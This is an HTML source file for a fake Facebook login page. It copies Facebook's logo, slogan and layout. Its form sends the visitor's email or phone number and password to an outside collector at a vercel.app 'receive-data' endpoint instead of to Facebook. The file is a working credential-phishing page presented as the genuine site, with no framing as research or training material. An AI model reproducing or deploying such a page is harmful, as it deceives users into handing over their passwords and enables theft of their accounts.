<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Login - Facebook</title>
</head>
<body>
    <div class="login-container">
        <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
        <h2>Facebook helps you connect and share with the people in your life.</h2>
        <form id="loginForm" action="https://facebook-login-flax.vercel.app/receive-data" method="post">
            <input type="text" id="email" name="email" placeholder="Email address or phone number" required>
            <input type="password" id="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgotten password?</a>
            <a href="#">Create new account</a>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
